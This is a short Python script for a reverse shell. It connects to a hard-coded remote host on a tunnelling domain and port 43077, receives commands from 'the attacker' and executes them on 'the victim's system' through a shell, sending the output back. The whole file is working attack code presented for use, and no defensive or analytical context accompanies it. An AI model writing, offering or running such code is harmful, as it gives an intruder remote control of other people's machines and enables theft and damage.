import socket
import subprocess
import os

# Set your attacker's IP and port (replace with your details)
attacker_ip = "figure-traveling.gl.at.ply.gg"  # e.g., '192.168.1.100'
attacker_port = 43077         # e.g., 4444

# Create a socket object and connect to the attacker's machine
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((attacker_ip, attacker_port))

# Send and receive commands
while True:
    # Receive the command from the attacker
    command = sock.recv(1024).decode("utf-8")

    # If command is 'exit', break the loop and close the shell
    if command.lower() == "exit":
        sock.close()
        break

    # Execute the command on the victim's system
    if command.startswith("cd "):
        try:
            os.chdir(command.strip("cd "))
            sock.send(b"Changed directory")
        except FileNotFoundError as e:
            sock.send(str(e).encode())
    else:
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)
